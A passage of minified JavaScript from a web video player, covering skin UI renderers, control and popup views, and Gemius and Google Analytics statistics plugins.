(this.currentStateName)},showSpinner:function(){null!=this.imagePlaceholder&&this.imagePlaceholder.visible&&this.imagePlaceholder.set_visible_with_redraw(!1),null==this.imageSpinner||this.imageSpinner.visible||this.imageSpinner.set_visible_with_redraw(!0)},hideSpinner:function(){null!=this.imageSpinner&&this.imageSpinner.visible&&this.imageSpinner.set_visible_with_redraw(!1)},showPlaceholder:function(){null!=this.imageSpinner&&this.imageSpinner.visible&&this.imageSpinner.set_visible_with_redraw(!1),null==this.imagePlaceholder||this.imagePlaceholder.visible||this.imagePlaceholder.set_visible_with_redraw(!0)},hidePlaceholder:function(){null!=this.imagePlaceholder&&this.imagePlaceholder.visible&&this.imagePlaceholder.set_visible_with_redraw(!1)},__class__:Ec});var Lb=function(){ic.call(this)};wa["bs.player.plugin.skin.ui.renderer.EpisodeListItemRenderer"]=Lb,Lb.__name__="bs.player.plugin.skin.ui.renderer.EpisodeListItemRenderer",Lb.__interfaces__=[bc],Lb.__super__=ic,Lb.prototype=Ja(ic.prototype,{episodeData:null,label:null,desc:null,imageCon:null,imageSpinner:null,imageHolder:null,play:null,set_data:function(b){return ic.prototype.set_data.call(this,b),this.episodeData=b,this.updateItemData(),b},select:function(){ic.prototype.select.call(this),isNaN(this.expandedHeight)||this.set_height(this.expandedHeight)},deselect:function(){ic.prototype.deselect.call(this),isNaN(this.collapsedHeight)||this.set_height(this.collapsedHeight)},updateItemData:function(){null!=this.episodeData&&(null==this.label&&(this.label=this.getChildById("SeriesPopupItemLabel")),null==this.label?console.error("Missing : SeriesPopupItemLabel element"):(this.label.set_text(this.episodeData.title),null==this.desc&&(this.desc=this.getChildById("SeriesPopupItemDescription")),null==this.desc?console.error("Missing : SeriesPopupItemDescription element"):(this.desc.set_text(this.episodeData.mediaDetails.descriptionLong),null==this.imageCon&&(this.imageCon=this.getChildById("SeriesPopupItemImageContainer")),null==this.imageCon?console.error("Missing : SeriesPopupItemImageContainer element"):(this.imageCon.overflowHidden=!0,null==this.play&&(this.play=this.imageCon.getChildById("SeriesPopupPlayButton")),null==this.play?console.error("Missing : SeriesPopupPlayButton element"):(this.play.addEventListener("click",U(this,this.onPlayClick)),null==this.imageHolder&&(this.imageHolder=this.imageCon.getChildById("SeriesPopupItemImageHolder")),null==this.imageHolder?console.error("Missing : SeriesPopupItemImageHolder element"):this.loadImage())))))},loadImage:function(){if(null!=this.episodeData.splashImages&&0<this.episodeData.splashImages.length){var b=jd.getBestFitFromSet(this.episodeData.splashImages,0|this.imageCon.calculateWidth(),0|this.imageCon.calculateHeight());this.imageHolder.onLoad=U(this,this.onImageLoaded),this.imageHolder.onLoadError=U(this,this.onImageError),this.imageHolder.set_data(b.url)}},onImageError:function(){},onImageLoaded:function(){this.imageHolder.isNativeElementNull()||(jd.coverRectangle(this.imageHolder,this.imageCon,this.imageHolder.get_size()[0],this.imageHolder.get_size()[1]),this.imageHolder.redraw())},onPlayClick:function(b){b.stopPropagation(),this.onItemClicked(this.episodeData)},__class__:Lb});var Gc=function(){rc.call(this),this.addEventListener("click",U(this,this.onClick))};wa["bs.player.plugin.skin.ui.renderer.LabelRenderer"]=Gc,Gc.__name__="bs.player.plugin.skin.ui.renderer.LabelRenderer",Gc.__interfaces__=[bc],Gc.__super__=rc,Gc.prototype=Ja(rc.prototype,{setStateName:function(b){if(this.set_styles(this.generateStyles(b)),null!=this.styles&&(this.styles.isClean=!1),null!=this.children)for(var c=0,d=this.children;c<d.length;){var q=d[c];++c,fb.__cast(q,Xb).setStateName(b)}return this.styles},allowHighlight:function(b){},onItemSelected:function(b){},onItemClicked:function(b){},onSubItemSelected:function(b,c){},onClick:function(b){b.stopPropagation(),this.onItemSelected(this.data)},onOver:function(b){"selected"!=this.currentStateName[0]&&(rc.prototype.onOver.call(this,b),this.redrawCall())},onOut:function(b){"selected"!=this.currentStateName[0]&&(rc.prototype.onOut.call(this,b),this.redrawCall())},updateItemsData:function(){for(var b=0,c=this.children;b<c.length;){var d=c[b];++b,d instanceof Qc&&fb.__cast(d,Qc).set_text(this.data.label)}},set_data:function(b){return this.data=b,null!=this.data&&(this.updateItemsData(),this.redrawCall()),this.data},select:function(){this.currentStateName[0]="selected",this.setStateName(this.currentStateName)},deselect:function(){this.currentStateName[0]="normal",this.setStateName(this.currentStateName)},__class__:Gc});var Yc=function(){this.activeOffset=new Vb(-1,-3),fc.call(this)};wa["bs.player.plugin.skin.ui.renderer.ProgressMarkerRenderer"]=Yc,Yc.__name__="bs.player.plugin.skin.ui.renderer.ProgressMarkerRenderer",Yc.__interfaces__=[bc],Yc.__super__=fc,Yc.prototype=Ja(fc.prototype,{markerData:null,marker:null,activeOffset:null,onItemSelected:function(b){},onItemClicked:function(b){},onSubItemSelected:function(b,c){},activeState:function(){"active"!=this.marker.currentStateName[0]&&(this.marker.currentStateName[0]="active",this.marker.setStateName(this.marker.currentStateName),this.marker.redrawCall())},normalState:function(){"normal"!=this.marker.currentStateName[0]&&(this.marker.currentStateName[0]="normal",this.marker.setStateName(this.marker.currentStateName),this.marker.redrawCall())},updateLeft:function(){var b=!1;this.get_left()!=this.markerData.left&&(this.set_left(this.markerData.left),b=!0),b&&this.redrawCall()},select:function(){var b=!1;this.marker.get_top()!=this.activeOffset.y&&(this.marker.set_top(this.activeOffset.y),b=!0),this.marker.get_bottom()!=this.activeOffset.y&&(this.marker.set_bottom(this.activeOffset.y),b=!0),this.marker.get_left()!=this.activeOffset.x&&(this.marker.set_left(this.activeOffset.x),b=!0),this.marker.get_right()!=this.activeOffset.x&&(this.marker.set_right(this.activeOffset.x),b=!0),b&&this.redrawCall()},deselect:function(){var b=!1;0!=this.marker.get_top()&&(this.marker.set_top(0),b=!0),0!=this.marker.get_bottom()&&(this.marker.set_bottom(0),b=!0),0!=this.marker.get_left()&&(this.marker.set_left(0),b=!0),0!=this.marker.get_right()&&(this.marker.set_right(0),b=!0),b&&this.redrawCall()},allowHighlight:function(b){},layoutComplete:function(){fc.prototype.layoutComplete.call(this),null==this.marker&&(this.marker=this.getChildById("ProgressbarMarker")),null==this.marker&&console.error("Missing : ProgressbarMarker element in layout")},set_data:function(b){return fc.prototype.set_data.call(this,b),this.markerData=b,this.set_left(this.markerData.left),b},__class__:Yc});var Kc=function(){this.gapWidth=0,fc.call(this)};wa["bs.player.plugin.skin.ui.renderer.ProgressSegmentRenderer"]=Kc,Kc.__name__="bs.player.plugin.skin.ui.renderer.ProgressSegmentRenderer",Kc.__interfaces__=[bc],Kc.__super__=fc,Kc.prototype=Ja(fc.prototype,{segmentData:null,bg:null,progress:null,gap:null,gapWidth:null,set_data:function(b){return fc.prototype.set_data.call(this,b),this.segmentData=b,this.updateGap(),this.updateWidth(),this.updateProgress(),b},onItemSelected:function(b){},onItemClicked:function(b){},onSubItemSelected:function(b,c){},select:function(){var b=!1;-1!=this.get_top()&&(this.set_top(-1),b=!0),-1!=this.get_bottom()&&(this.set_bottom(-1),b=!0),b&&this.redrawCall()},deselect:function(){var b=!1;0!=this.get_top()&&(this.set_top(0),b=!0),0!=this.get_bottom()&&(this.set_bottom(0),b=!0),b&&this.redrawCall()},allowHighlight:function(b){},layoutComplete:function(){fc.prototype.layoutComplete.call(this),null==this.bg&&(this.bg=this.getChildById("ProgressbarSegmentBackground")),null==this.bg&&console.error("Missing : ProgressbarSegmentBackground element in layout"),null==this.progress&&(this.progress=this.getChildById("ProgressbarSegmentProgress")),null==this.progress&&console.error("Missing : ProgressbarSegmentProgress element in layout"),null==this.gap&&(this.gap=this.getChildById("ProgressbarSegmentGap")),null!=this.gap&&null!=this.gap.get_width()&&(this.gapWidth=this.gap.get_width(),this.gap.destroy())},updateGap:function(){null!=this.segmentData&&this.segmentData.isLast?(this.bg.set_right(0),this.progress.set_right(0)):(this.bg.set_right(this.gapWidth),this.progress.set_right(this.gapWidth))},updateWidth:function(){null!=this.segmentData&&null!=this.segmentData.width&&this.get_width()!=this.segmentData.width&&this.set_width(this.segmentData.width)},updateProgress:function(){if(null==this.progress&&(this.progress=this.getChildById("ProgressbarSegmentProgress")),null==this.progress)console.error("Missing : ProgressbarSegmentProgress element in layout");else if(null!=this.segmentData.progress){var b=0,c=this.segmentData.progress,d=this.segmentData.progressLeft,q=this.segmentData.progressRight;0<c&&(b=c<d?0:c>q?1:(c-d)/this.segmentData.progressPercent),(b*=this.segmentData.width)>this.segmentData.width-this.gapWidth&&(b=this.segmentData.width-this.gapWidth),this.progress.get_width()!=b&&this.progress.set_width(b)}},__class__:Kc});var Ve=function(){this.position=new Vb,this.rendered=this.selected=!1,fc.call(this),this.alpha=0,this.overflowHidden=!0};wa["bs.player.plugin.skin.ui.renderer.ProgressThumbRenderer"]=Ve,Ve.__name__="bs.player.plugin.skin.ui.renderer.ProgressThumbRenderer",Ve.__interfaces__=[bc],Ve.__super__=fc,Ve.prototype=Ja(fc.prototype,{thumbData:null,image:null,rendered:null,selected:null,position:null,set_data:function(b){return fc.prototype.set_data.call(this,b),this.thumbData=b},onItemSelected:function(b){},onItemClicked:function(b){},onSubItemSelected:function(b,c){},select:function(){if(this.updateThumbnail(),1==this.rendered&&1!=this.selected){this.selected=!0;var b=!1;1!=this.alpha&&(this.alpha=1,b=!0),b&&this.redrawCall()}},deselect:function(){if(0!=this.selected){var b=this.selected=!1;0!=this.alpha&&(this.alpha=0,b=!0),b&&this.redrawCall()}},allowHighlight:function(b){},layoutComplete:function(){fc.prototype.layoutComplete.call(this),null==this.image&&(this.image=this.getChildById("ProgressThumbRendererImage"))},determineSize:function(b){var c=this,d=new Image;d.onload=function(q){(q=new Zd).w=c.data.w=c.thumbData.w=d.width,q.h=c.data.h=c.thumbData.h=d.height,b(q)},d.src=this.thumbData.url},updateThumbnail:function(){1==this.rendered&&this.position.x==this.thumbData.x&&this.position.y==this.thumbData.y||(this.isNativeElementNull()&&this.buildNativeElement(),this.renderThumbnail(),this.updateSize(),this.rendered=!0)},renderThumbnail:function(){var b=fb.__cast(this.image.element.instance,HTMLElement);if(null!=b){"no-repeat"!=b.style.backgroundRepeat&&(b.style.backgroundRepeat="no-repeat");var c='url("'+this.thumbData.url+'")';b.style.backgroundImage!=c&&(b.style.backgroundImage=c),"black"!=b.style.backgroundColor&&(b.style.backgroundColor="black"),c=this.position.x,isNaN(c)?c=!1:(c=this.position.y,c=!isNaN(c)),!c||this.thumbData.x==this.position.x&&this.thumbData.y==this.position.y||(this.position.x=this.thumbData.x,this.position.y=this.thumbData.y,b.style.backgroundPosition="-"+this.thumbData.x+"px -"+this.thumbData.y+"px")}this.rendered=!0},updateSize:function(){var b=this.thumbData.w;(null!=b||isNaN(b))&&this.get_width()!=b&&this.set_width(b);var c=this.thumbData.h;(null!=c||isNaN(c))&&this.get_height()!=c&&this.set_height(c),null!=this.thumbData.renderWidth&&null!=this.thumbData.renderHeight&&(this.parent.get_width()!=this.thumbData.renderWidth&&this.parent.set_width(this.thumbData.renderWidth),this.parent.get_height()!=this.thumbData.renderHeight&&this.parent.set_height(this.thumbData.renderHeight),c=new Vb(this.thumbData.renderWidth/b,this.thumbData.renderHeight/c),b=fb.__cast(this.element.instance,HTMLElement),c="scaleX("+c.x+") scaleY("+c.y+")",b.style.transform!=c&&(b.style.transform=c),"0 0"!=b.style.transformOrigin&&(b.style.transformOrigin="0 0"))},__class__:Ve});var Qc=function(){Xb.call(this),this.elementType=n.TXT,this.set_text(""),this.allowRedraw=!0};wa["bs.player.plugin.skin.ui.text.Label"]=Qc,Qc.__name__="bs.player.plugin.skin.ui.text.Label",Qc.__super__=Xb,Qc.prototype=Ja(Xb.prototype,{color:null,text:null,size:null,format:null,redraw:function(){if(null!=this.element&&(fb.__cast(this.element,Gb).setText(this.text),null!=this.element&&!this.isNativeElementNull())){if(1==Ma.allowGpuRedraw&&Ma.enableGPU(this),null!=this.getStyleForStateName())switch(this.elementType._hx_index){case 0:Ma.redrawDefault(this),Ma.redrawTxt(this);break;case 1:Ma.redrawDefault(this),Ma.redrawBox(this);break;case 2:Ma.checkSvgDirty(this)&&Ma.redrawSvg(this);break;case 3:Ma.redrawImg(this);break;case 4:Ma.redrawDefault(this),Ma.redrawShape(this)}this.checkHide(),this.forceHide&&(Ma.addCssClass(this,"hideElement"),this.isNativeElementNull()||this.element.instance.classList.contains("showElement")&&this.element.instance.classList.remove("showElement"))}},createNativeElement:function(){this.element=new Gb,this.eventElement=this.element.create()},calculateTextWidth:function(){return this.isNativeElementNull()?0:this.element.instance.offsetWidth+1},calculateTextHeight:function(){return this.isNativeElementNull()?0:this.element.instance.offsetHeight+1},set_size:function(b){return this.size=b},set_color:function(b){return this.color=b,this.update(),this.color},set_text:function(b){return this.text=b,null!=this.text&&(this.text=f.replace(this.text,"\n","</br>")),this.update(),this.text},__class__:Qc,__properties__:Ja(Xb.prototype.__properties__,{set_size:"set_size",set_text:"set_text",set_color:"set_color"})});var ye=function(){this.textSize=10,this.parentWidth=this.textWidth=0,Qc.call(this)};wa["bs.player.plugin.skin.ui.text.ResponsiveLabel"]=ye,ye.__name__="bs.player.plugin.skin.ui.text.ResponsiveLabel",ye.__super__=Qc,ye.prototype=Ja(Qc.prototype,{parentWidth:null,textWidth:null,textSize:null,fitFontSizeToParentWidth:function(b){null==b&&(b=!0);try{if(0==this.text.length||this.parentWidth==this.parent.calculateWidth()&&this.textWidth==this.calculateTextWidth())return}catch(q){return}this.parentWidth=this.parent.calculateWidth(),this.textWidth=this.calculateTextWidth(),null!=this.parent?this.parent.calculateWidth():this.calculateTextWidth();var c=this.parent.calculateWidth()/this.calculateTextWidth();if(c*=this.textSize,this.textSize=Math.floor(c>this.styles.fontResponsive.max?this.styles.fontResponsive.max:c<this.styles.fontResponsive.min?this.styles.fontResponsive.min:c),this.styles.fontSize=this.textSize,this.redraw(),1==b){var d=U(this,this.fitFontSizeToParentWidth);b=!1,Rb.delay((function(){d(b)}),100)}},fitFontSizeToParentHeight:function(){var b=this.parent.calculateHeight();this.calculateTextHeight()>this.parent.calculateHeight()&&(this.parent.calculateWidth(),this.calculateTextWidth(),b*=.7,this.styles.fontSize=1*Math.floor(b>this.styles.fontResponsive.max?this.styles.fontResponsive.max:b<this.styles.fontResponsive.min?this.styles.fontResponsive.min:b))},calculateY:function(){if(null!=this.parent)switch(this.get_align()){case"bottom":return this.parent.calculateHeight()-this.calculateTextHeight()-(null!=this.get_bottom()?this.get_bottom():0)|0;case"middle":return(this.parent.calculateHeight()-this.calculateTextHeight())/2|0;case"top":return 0}return Qc.prototype.calculateY.call(this)},minMax:function(b){return Math.floor(b>this.styles.fontResponsive.max?this.styles.fontResponsive.max:b<this.styles.fontResponsive.min?this.styles.fontResponsive.min:b)},__class__:ye});var ze=function(){Qc.call(this)};wa["bs.player.plugin.skin.ui.text.Text"]=ze,ze.__name__="bs.player.plugin.skin.ui.text.Text",ze.__super__=Qc,ze.prototype=Ja(Qc.prototype,{__class__:ze});var Ob=function(b){Xb.call(this),this.stage=b};wa["bs.player.plugin.skin.view.core.View"]=Ob,Ob.__name__="bs.player.plugin.skin.view.core.View",Ob.__super__=Xb,Ob.prototype=Ja(Xb.prototype,{stage:null,root:null,destroy:function(){var b=fb.getClass(this);b=g.getInstanceFields(b);for(var c=0;c<b.length;){var d=b[c];++c,(d=m.field(this,d))instanceof Xb&&d!=this.stage&&fb.__cast(d,Xb).destroy()}null!=this.root&&this.root.destroy(),this.stage=this.root=null,Xb.prototype.destroy.call(this)},__class__:Ob});var Ke=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.AirPlayButtonView"]=Ke,Ke.__name__="bs.player.plugin.skin.view.AirPlayButtonView",Ke.__super__=Ob,Ke.prototype=Ja(Ob.prototype,{preSpacer:null,postSpacer:null,__class__:Ke});var Ne=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.BrandButtonView"]=Ne,Ne.__name__="bs.player.plugin.skin.view.BrandButtonView",Ne.__super__=Ob,Ne.prototype=Ja(Ob.prototype,{titleBox:null,titleLabel:null,controlbarBox:null,button:null,destroy:function(){Ob.prototype.destroy.call(this),this.button=this.controlbarBox=null},__class__:Ne});var Me=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.ChromecastButtonView"]=Me,Me.__name__="bs.player.plugin.skin.view.ChromecastButtonView",Me.__super__=Ob,Me.prototype=Ja(Ob.prototype,{preSpacer:null,postSpacer:null,__class__:Me});var He=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.ControlbarView"]=He,He.__name__="bs.player.plugin.skin.view.ControlbarView",He.__super__=Ob,He.prototype=Ja(Ob.prototype,{container:null,__class__:He});var Le=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.FullscreenButtonView"]=Le,Le.__name__="bs.player.plugin.skin.view.FullscreenButtonView",Le.__super__=Ob,Le.prototype=Ja(Ob.prototype,{preSpacer:null,postSpacer:null,__class__:Le});var Je=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.PictureInPictureButtonView"]=Je,Je.__name__="bs.player.plugin.skin.view.PictureInPictureButtonView",Je.__super__=Ob,Je.prototype=Ja(Ob.prototype,{preSpacer:null,postSpacer:null,__class__:Je});var Pe=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.ShareButtonsView"]=Pe,Pe.__name__="bs.player.plugin.skin.view.ShareButtonsView",Pe.__super__=Ob,Pe.prototype=Ja(Ob.prototype,{embed:null,mail:null,facebook:null,twitter:null,linkedIn:null,__class__:Pe});var Ge=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.SkinShowHideView"]=Ge,Ge.__name__="bs.player.plugin.skin.view.SkinShowHideView",Ge.__super__=Ob,Ge.prototype=Ja(Ob.prototype,{titleBox:null,controlbarBox:null,channelsPopup:null,volumePopup:null,subtitlePopup:null,audioPopup:null,seriesPopup:null,progressPopup:null,videoQualityPopup:null,brandButton:null,shareBox:null,playResumePopup:null,close:null,__class__:Ge});var Oe=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.TitleView"]=Oe,Oe.__name__="bs.player.plugin.skin.view.TitleView",Oe.__super__=Ob,Oe.prototype=Ja(Ob.prototype,{title:null,subtitle:null,__class__:Oe});var Ed=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.popup.core.PopupView"]=Ed,Ed.__name__="bs.player.plugin.skin.view.popup.core.PopupView",Ed.__super__=Ob,Ed.prototype=Ja(Ob.prototype,{popup:null,preSpacer:null,postSpacer:null,__class__:Ed});var rd=function(b){Ob.call(this,b),this.allowRedraw=!0};wa["bs.player.plugin.skin.view.popup.PopupListView"]=rd,rd.__name__="bs.player.plugin.skin.view.popup.PopupListView",rd.__super__=Ed,rd.prototype=Ja(Ed.prototype,{list:null,itemRenderer:null,__class__:rd});var Ie=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.popup.ProgressView"]=Ie,Ie.__name__="bs.player.plugin.skin.view.popup.ProgressView",Ie.__super__=Ed,Ie.prototype=Ja(Ed.prototype,{controlbarBox:null,controlbarContainer:null,time:null,timePreSpacer:null,timePostSpacer:null,slash:null,duration:null,track:null,segmentList:null,markerList:null,indicator:null,popupBackgroundTip:null,popupBackground:null,popupThumbnails:null,popupLabel:null,popupExtraLabel:null,adLabel:null,adTimer:null,liveButtonPreSpacer:null,liveButton:null,liveButtonPostSpacer:null,__class__:Ie});var Re=function(b){rd.call(this,b)};wa["bs.player.plugin.skin.view.popup.SeriesView"]=Re,Re.__name__="bs.player.plugin.skin.view.popup.SeriesView",Re.__super__=rd,Re.prototype=Ja(rd.prototype,{listButtonLeft:null,listButtonRight:null,title:null,spinner:null,__class__:Re});var Qe=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.popup.VolumeView"]=Qe,Qe.__name__="bs.player.plugin.skin.view.popup.VolumeView",Qe.__super__=Ed,Qe.prototype=Ja(Ed.prototype,{track:null,progress:null,indicator:null,__class__:Qe});var sd=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.splash.DefaultSplashView"]=sd,sd.__name__="bs.player.plugin.skin.view.splash.DefaultSplashView",sd.__super__=Ob,sd.prototype=Ja(Ob.prototype,{button:null,pauseButton:null,image:null,imageContainer:null,destroy:function(){Ob.prototype.destroy.call(this),this.image=this.pauseButton=this.button=null},__class__:sd});var cd=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.splash.end.CountdownEndSplashView"]=cd,cd.__name__="bs.player.plugin.skin.view.splash.end.CountdownEndSplashView",cd.__super__=Ob,cd.prototype=Ja(Ob.prototype,{box:null,content:null,leftPanel:null,imageContainer:null,imageHolder:null,imageSpinner:null,rightPanel:null,title:null,counter:null,button:null,destroy:function(){Ob.prototype.destroy.call(this),this.button=this.counter=this.title=this.rightPanel=this.imageSpinner=this.imageHolder=this.imageContainer=this.leftPanel=this.content=this.stage=null},__class__:cd});var Dd=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.splash.end.SocialEndSplashView"]=Dd,Dd.__name__="bs.player.plugin.skin.view.splash.end.SocialEndSplashView",Dd.__super__=Ob,Dd.prototype=Ja(Ob.prototype,{embed:null,mail:null,facebook:null,twitter:null,linkedIn:null,destroy:function(){Ob.prototype.destroy.call(this),this.linkedIn=this.twitter=this.facebook=this.mail=this.embed=this.stage=null},__class__:Dd});var Ld=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.splash.end.TilesView"]=Ld,Ld.__name__="bs.player.plugin.skin.view.splash.end.TilesView",Ld.__super__=Ob,Ld.prototype=Ja(Ob.prototype,{box:null,tiles:null,itemRenderer:null,gapRenderer:null,destroy:function(){Ob.prototype.destroy.call(this),this.gapRenderer=this.itemRenderer=this.tiles=this.box=null},__class__:Ld});var Ue=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.splash.start.SplashImageView"]=Ue,Ue.__name__="bs.player.plugin.skin.view.splash.start.SplashImageView",Ue.__super__=Ob,Ue.prototype=Ja(Ob.prototype,{image:null,__class__:Ue});var Te=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.window.AdvertisementsView"]=Te,Te.__name__="bs.player.plugin.skin.view.window.AdvertisementsView",Te.__super__=Ob,Te.prototype=Ja(Ob.prototype,{bar:null,title:null,time:null,counter:null,play:null,close:null,mute:null,click:null,closeSpacer:null,__class__:Te});var Se=function(b){Ob.call(this,b)};wa["bs.player.plugin.skin.view.window.MessageWindowView"]=Se,Se.__name__="bs.player.plugin.skin.view.window.MessageWindowView",Se.__super__=Ob,Se.prototype=Ja(Ob.prototype,{window:null,close:null,title:null,titleBar:null,text:null,textDetails:null,userSingleActionButton:null,userSingleActionButtonText:null,__class__:Se});var We=function(){this.isLive=this.isDvr=!1,this.gemiusStream=null,this.collector={},this.currentTime=this.liveTime=0,this.playerId=null,this.treeId=[],this.additionalPackage=[],this.customPackage=[],this.materialIdentifier=this.totalTime=null,this.encoding="utf-8",this.identifier=null,this.hitCollector="https://sdk.hit.gemius.pl",this.apiUrl="https://sdk.hit.gemius.pl/gstream.js",this.areListenersAttached=!1,lb.call(this),this.pluginConfig={},this.areListenersAttached=!1};wa["bs.player.plugin.stats.GemiusStream"]=We,We.__name__="bs.player.plugin.stats.GemiusStream",We.__super__=lb,We.prototype=Ja(lb.prototype,{areListenersAttached:null,apiUrl:null,hitCollector:null,identifier:null,encoding:null,materialIdentifier:null,totalTime:null,customPackage:null,additionalPackage:null,treeId:null,playerId:null,currentTime:null,liveTime:null,collector:null,gemiusStream:null,isLive:null,isDvr:null,create:function(){var b=this,c=this.get_variables();if(Object.prototype.hasOwnProperty.call(c,"gemius")&&(c=m.field(this.get_variables(),"gemius"),this.apiUrl=this.selectVariable(m.field(c,"gsmapiurl"),this.apiUrl),this.hitCollector=this.selectVariable(m.field(c,"gsmhitcollector"),this.hitCollector),this.identifier=this.selectVariable(m.field(c,"gsmidentifier"),this.identifier),this.encoding=this.selectVariable(m.field(c,"gsencoding"),this.encoding),this.playerId=this.selectVariable(m.field(c,"gsmplayerid"),this.uid),null!=this.identifier&&""!=this.identifier)){var d=window;d.gemiusStream?this.gemiusStream=d.gemiusStream:((c=new G(this.apiUrl)).onData=function(q){var X=document.createElement("script");X.text=q,document.head.appendChild(X).parentNode.removeChild(X),b.gemiusStream=d.gemiusStream},c.request(!1)),aa.add(this.context,"mediaMetadataData",U(this,this.onMetadataData)),aa.add(this.context,"mediaAfterPlaybackStartMetadata",U(this,this.onAfterPlaybackStartMetadataData))}},destroy:function(){this.removeEventListeners(),this.areListenersAttached=!1},onMetadataData:function(b){this.isDvr=b.data instanceof xa?this.isLive=!0:this.isLive=!1,this.removeEventListeners(),T.addOnce(this.context,"playing",U(this,this.onFirstPlay))},onAfterPlaybackStartMetadataData:function(b){b.data instanceof xa&&!this.isDvr&&(this.isDvr=this.isLive=!0)},onFirstPlay:function(b){this.newMedia(b),this.logEvent(b),this.addEventListeners()},onVideoEvent:function(b){this.logEvent(b),"complete"==b.type&&(this.removeEventListeners(),T.addOnce(this.context,"playing",U(this,this.onFirstPlay)))},newMedia:function(b){var c=this.selectVariable(m.field(b.data.media.customParams,"gsmmaterialidentifier"),m.field(this.get_variables().gemius,"gsmmaterialidentifier"),b.data.media.id);this.customPackage=this.selectVariable(m.field(b.data.media.customParams,"gsmcustompackage"),m.field(this.get_variables().gemius,"gsmcustompackage")),this.additionalPackage=this.selectVariable(m.field(b.data.media.customParams,"gsmadditionalpackage"),m.field(this.get_variables().gemius,"gsmadditionalpackage")),this.treeId=this.selectVariable(m.field(b.data.media.customParams,"gsmtreeid"),m.field(this.get_variables().gemius,"gsmtreeid")),this.materialIdentifier!=c&&(this.gemiusStream.closeStream(this.playerId,this.materialIdentifier,this.totalTime),this.totalTime=this.isLive?-1:b.data.duration,this.liveTime=b.data.duration,this.currentTime=b.data.currentTime,this.isLive&&0>this.currentTime&&(this.currentTime=this.liveTime),this.materialIdentifier=c,this.gemiusStream.newStream(this.playerId,this.materialIdentifier,this.totalTime,this.customPackage,this.additionalPackage,this.identifier,this.hitCollector,this.treeId))},logEvent:function(b){switch(b.type){case"bufferingStart":var c="buffering";break;case"complete":c="complete";break;case"paused":c="paused";break;case"playing":c="playing";break;case"seekingStart":c="seekingStarted";break;case"stopped":c="stopped";break;default:c=null}this.currentTime=this.isLive?this.liveTime-b.data.currentTime:b.data.currentTime,this.isLive&&0>b.data.currentTime&&(this.currentTime=0),null!=c&&this.gemiusStream.event(this.playerId,this.materialIdentifier,Math.round(this.currentTime),b.type)},addEventListeners:function(){this.areListenersAttached||(this.areListenersAttached=!0,T.add(this.context,"playing",U(this,this.onVideoEvent)),T.add(this.context,"paused",U(this,this.onVideoEvent)),T.add(this.context,"stopped",U(this,this.onVideoEvent)),T.add(this.context,"bufferingStart",U(this,this.onVideoEvent)),T.add(this.context,"seekingStart",U(this,this.onVideoEvent)),T.add(this.context,"complete",U(this,this.onVideoEvent)))},removeEventListeners:function(){this.areListenersAttached&&(this.areListenersAttached=!1,T.remove(this.context,"playing",U(this,this.onVideoEvent)),T.remove(this.context,"paused",U(this,this.onVideoEvent)),T.remove(this.context,"stopped",U(this,this.onVideoEvent)),T.remove(this.context,"bufferingStart",U(this,this.onVideoEvent)),T.remove(this.context,"seekingStart",U(this,this.onVideoEvent)),T.remove(this.context,"complete",U(this,this.onVideoEvent)))},selectVariable:function(b,c,d,q,X,ra,Aa){return null!=b||null!=(b=c)||null!=(b=d)||null!=(b=q)||null!=(b=X)||null!=(b=ra)||null!=(b=Aa)?b:null},__class__:We});var Xe=function(){lb.call(this),this.pluginConfig={},this.areListenersAttached=!1};wa["bs.player.plugin.stats.GoogleAnalytics"]=Xe,Xe.__name__="bs.player.plugin.stats.GoogleAnalytics",Xe.__super__=lb,Xe.prototype=Ja(lb.prototype,{collector:null,contentType:null,contentTags:null,collectorUrl:null,collectorTrackerId:null,collectorSendInterval:null,areListenersAttached:null,destroy:function(){this.removeEventListeners(),this.areListenersAttached=!1},activate:function(){aa.add(this.context,"mediaMetadataData",U(this,this.onSetData)),this.initCollectorParams()},initCollectorParams:function(){this.collectorUrl="https://www.google-analytics.com/collect",this.collectorSendInterval=10,this.initCollectorParamsFromObject(this.pluginConfig);var b=this.get_variables();Object.prototype.hasOwnProperty.call(b,"googleAnalytics")&&null!=m.field(this.get_variables(),"googleAnalytics")&&this.initCollectorParamsFromObject(m.field(this.get_variables(),"googleAnalytics"))},initCollectorParamsFromObject:function(b){Object.prototype.hasOwnProperty.call(b,"url")&&null!=m.field(b,"url")&&(this.collectorUrl=m.field(b,"url")),Object.prototype.hasOwnProperty.call(b,"trackerId")&&null!=m.field(b,"trackerId")&&(this.collectorTrackerId=m.field(b,"trackerId")),Object.prototype.hasOwnProperty.call(b,"sendInterval")&&null!=m.field(b,"sendInterval")&&(this.collectorSendInterval=m.field(b,"sendInterval"))},onSetData:function(b){this.hasValidTrackerId()?(this.collector=new gf(this.collectorUrl,this.collectorTrackerId,b.data.id,this.contentType,this.contentTags,Math.floor(b.data.duration),this.collectorSendInterval),this.addEventListeners()):(b=this.get_variables(),Object.prototype.hasOwnProperty.call(b,"googleAnalytics"))},hasValidTrackerId:function(){return 